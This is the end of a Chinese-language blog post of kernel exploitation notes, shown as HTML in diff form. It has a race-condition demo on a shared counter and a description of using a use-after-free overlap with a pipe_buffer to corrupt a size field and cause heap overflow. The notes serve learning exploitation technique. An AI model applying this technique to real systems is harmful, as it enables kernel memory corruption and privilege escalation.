class="keyword">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        pthread_join(p[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建10个线程，常理说应该线程应该按从小到大的顺序输出相应顺序的数字，但是由于 counter 是全局共享的资源，在 race window 的间隙里面可能多个线程对 counter 进行写、读操作，导致输出结果很难预料，如下： （多次尝试的结果还不同）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o test -pthread</span><br><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">Thread <span class="number">-967665920</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1043200256</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1034807552</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-976058624</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1026414848</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-984451328</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-992844032</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1009629440</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1001236736</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1018022144</span> has counter value <span class="number">10</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">Thread <span class="number">1636828928</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1586472704</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1594865408</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1603258112</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1569687296</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1578080000</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1628436224</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1645221632</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1611650816</span> has counter value <span class="number">6</span></span><br><span class="line">Thread <span class="number">1620043520</span> has counter value <span class="number">8</span></span><br></pre></td></tr></table></figure>
+<h2 id="pipe-trick"><a href="#pipe-trick" class="headerlink" title="pipe trick"></a>pipe trick</h2><p>pipe 的读和写没有专门的函数，直接使用 write 和 read 操作之前 pipe 返回的文件描述符即可，pipefd[1] 用来写，pipefd[0] 用来读</p>
+<p>结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> wait; <span class="comment">/* 等待队列,用于存储正在等待管道可读或者可写的进程 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nrbufs; <span class="comment">/* 表示未读数据已经占用了环形缓冲区的多少个内存页 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> curbuf; <span class="comment">/* 表示当前正在读取环形缓冲区的哪个内存页中的数据 */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readers; <span class="comment">/* 表示正在读取管道的进程数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">/* 表示正在写入管道的进程数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> waiting_writers; <span class="comment">/* 表示等待管道可写的进程数 */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span> <span class="comment">/* 与管道关联的inode对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">bufs</span>[16];</span> <span class="comment">/* 管道缓冲区 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> <span class="comment">/* 指向包含管道缓冲区数据的页面 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len; <span class="comment">/* 页面内数据的偏移量,长度 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span> <span class="comment">/* 与此缓冲区关联的操作 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags; <span class="comment">/* 管道缓冲区标志 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>; <span class="comment">/* 运维人员拥有的私有数据 */</span></span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure>
+<p>关于这个 pipe_buffer，有个小 trick：</p>
+<ul>
+<li>使用 write(pfd[1],buf,0x100)，就是使用管道传输信息<ul>
+<li>write(pfd[1],buf,0x100) 执行之前，offset = 0，len = 0</li>
+<li>write(pfd[1],buf,0x100) 执行之后，offset = 0，len = 0x100</li>
+</ul>
+</li>
+<li>offset 和 len 都是4字节数据，如果把它们拼在一起，凑成8字节，就是 0x10000000000</li>
+<li>如果我们用 UAF，使其 pipe_buffer 和另一个结构体重合，那么该结构体对应位置也会变为 0x10000000000</li>
+<li>如果该结构体与内存管理有关，并且该位表示 size 的话，就可以造成堆溢出 </li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+              <a href="/tags/ret2usr/" rel="tag"><i class="fa fa-tag"></i> ret2usr</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/" rel="prev" title="不务正业系列：白嫖网易云（偶尔更新）">
+      <i class="fa fa-chevron-left"></i> 不务正业系列：白嫖网易云（偶尔更新）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/23/BuddySystem&Slab/" rel="next" title="BuddySystem&Slub">
+      BuddySystem&Slub <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">1.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-attack"><span class="nav-number">2.</span> <span class="nav-text">tty_struct attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-trick"><span class="nav-number">4.</span> <span class="nav-text">pipe trick</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
